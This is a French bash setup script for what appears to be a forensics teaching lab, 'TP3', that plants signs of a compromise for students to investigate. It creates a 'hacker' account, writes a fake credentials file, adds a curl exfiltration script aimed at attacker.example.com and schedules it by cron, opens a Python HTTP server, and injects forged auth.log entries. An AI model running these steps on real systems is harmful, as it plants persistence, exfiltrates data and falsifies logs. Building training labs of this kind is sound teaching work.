#!/bin/bash

echo "🔧 Installation TP3 : Système Compromis - Version Corrigée"

# Nettoyer d'abord si l'utilisateur existe déjà
if id "hacker" &>/dev/null; then
    echo "⚠️  L'utilisateur 'hacker' existe déjà, nettoyage..."
    pkill -u hacker 2>/dev/null
    crontab -u hacker -r 2>/dev/null
    deluser hacker 2>/dev/null || userdel hacker 2>/dev/null
    rm -rf /home/hacker 2>/dev/null
fi

# 1. Créer l'utilisateur hacker (méthode compatible)
echo "1️⃣  Création de l'utilisateur hacker..."
if command -v useradd &> /dev/null; then
    useradd -m -s /bin/bash hacker
    echo "hacker:password123" | chpasswd
elif command -v adduser &> /dev/null; then
    adduser --disabled-password --gecos "" hacker
    echo "hacker:password123" | chpasswd
else
    # Méthode manuelle si les commandes n'existent pas
    echo "hacker:x:1003:1003::/home/hacker:/bin/bash" >> /etc/passwd
    echo "hacker:x:1003:" >> /etc/group
    mkdir -p /home/hacker
    chown 1003:1003 /home/hacker
    # Créer un hash de mot de passe (password123)
    echo 'hacker:$6$rounds=656000$YourSaltHere$hashhere:19000:0:99999:7:::' >> /etc/shadow
fi

# 2. Créer les fichiers suspects
echo "2️⃣  Création des fichiers suspects..."
mkdir -p /tmp/.hidden
cat > /tmp/.hidden/data.txt << 'EOF'
=== DONNÉES VOLÉES ===
admin:AdminP@ss2024
user1:MySecret123
database:DbP@ssw0rd!
root:R00tAccess99
EOF

# 3. Créer le script d'exfiltration
cat > /tmp/.hidden/exfiltrate.sh << 'EOF'
#!/bin/bash
curl -X POST http://attacker.example.com/data \
  -d "data=$(cat /tmp/.hidden/data.txt)" 2>/dev/null
EOF
chmod +x /tmp/.hidden/exfiltrate.sh
chown hacker:hacker /tmp/.hidden -R 2>/dev/null || chown 1003:1003 /tmp/.hidden -R

# 4. Démarrer le serveur HTTP sur le port 8888
echo "3️⃣  Démarrage du serveur HTTP malveillant..."
cd /tmp/.hidden
# Tuer tout processus existant sur le port 8888
pkill -f "python3.*8888" 2>/dev/null
fuser -k 8888/tcp 2>/dev/null

# Démarrer le serveur en arrière-plan en tant que hacker
if command -v sudo &> /dev/null && id hacker &>/dev/null; then
    sudo -u hacker python3 -m http.server 8888 > /dev/null 2>&1 &
else
    su - hacker -c "cd /tmp/.hidden && python3 -m http.server 8888 > /dev/null 2>&1 &" 2>/dev/null || \
    python3 -m http.server 8888 > /dev/null 2>&1 &
fi
sleep 2

# 5. Ajouter la tâche cron
echo "4️⃣  Ajout de la tâche cron malveillante..."
if command -v crontab &> /dev/null; then
    (crontab -u hacker -l 2>/dev/null; echo "*/5 * * * * /tmp/.hidden/exfiltrate.sh") | crontab -u hacker - 2>/dev/null || \
    echo "*/5 * * * * /tmp/.hidden/exfiltrate.sh" | crontab -u hacker -
fi

# 6. Simuler des logs d'activité suspecte
echo "5️⃣  Ajout de logs suspects..."
if [ -w /var/log/auth.log ]; then
    echo "$(date '+%b %d %H:%M:%S') $(hostname) sshd[$(shuf -i 1000-9999 -n 1)]: Accepted password for hacker from 192.168.1.100 port 45678 ssh2" >> /var/log/auth.log
    echo "$(date '+%b %d %H:%M:%S') $(hostname) sudo: hacker : TTY=pts/0 ; PWD=/tmp/.hidden ; USER=root ; COMMAND=/bin/bash" >> /var/log/auth.log
fi

# Vérifications finales
echo ""
echo "✅ TP3 installé avec succès !"
echo ""
echo "Vérifications :"

echo -n "1. Utilisateur hacker : "
if grep -q "^hacker:" /etc/passwd; then
    echo "✅"
else
    echo "❌"
fi

echo -n "2. Fichiers dans /tmp/.hidden : "
if [ -f /tmp/.hidden/data.txt ]; then
    echo "✅"
else
    echo "❌"
fi

echo -n "3. Processus Python : "
if pgrep -f "python3.*8888" > /dev/null; then
    echo "✅ (PID: $(pgrep -f 'python3.*8888'))"
else
    echo "❌"
fi

echo -n "4. Port 8888 ouvert : "
if ss -tulpn 2>/dev/null | grep -q ":8888" || netstat -tulpn 2>/dev/null | grep -q ":8888"; then
    echo "✅"
else
    echo "❌"
fi

echo ""
echo "🎯 Les étudiants doivent enquêter sur le système compromis"
